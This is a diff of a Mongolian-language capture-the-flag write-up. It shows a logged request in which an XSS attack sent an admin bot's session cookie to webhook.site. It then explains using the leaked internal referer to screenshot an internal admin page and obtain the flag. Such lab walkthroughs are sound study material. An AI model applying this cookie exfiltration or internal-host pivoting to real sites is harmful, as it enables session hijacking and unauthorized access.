@@ -14,21 +14,28 @@ XSS өртөмтгий байх амархан шалгаж болно.
 
 ирсэн хүсэлтийг шалгавал
 
-
+```
 request: https://webhook.site/ef1e3938-3e7a-49e6-bac0-09cb98fbf017?c=PHPSESSID%3DHZ%7Bye%40h_admin_cook1e_and_fl%40g_0f_ScreenShot_1%7D
 parameter:   	PHPSESSID=HZ{ye@h_admin_cook1e_and_fl@g_0f_ScreenShot_1}
-
+```
+```
 Headers
-connection 	close
-host 	webhook.site
-accept-language 	en,*
-accept-encoding 	gzip, deflate
-accept 	*/*
-user-agent 	Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
-referer 	http://screen/god-wisper.php
-content-length 	
-content-type 	
-
+connection: close
+host: 	webhook.site
+accept-language: 	en,*
+accept-encoding: 	gzip, deflate
+accept: 	*/*
+user-agent: 	Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+referer:	http://screen/god-wisper.php
+content-length: 	
+content-type:	
+```
 
 
 ## Screenshot-2
+
+зөвхөн дотоод IP хандана уу гэсэн байх бөгөөд. XSS ээр авсан хүсэлтийг дахиж харвал. 
+referer:	http://screen/god-wisper.php гэж байгаа
+http://screen/ гэдэг нь docker ийн дотоод хаяг гэж харж болхоор байна. иймд http://screen/admin.php -н screenshot -г харвал. 
+flag гарж ирнэ. 
+
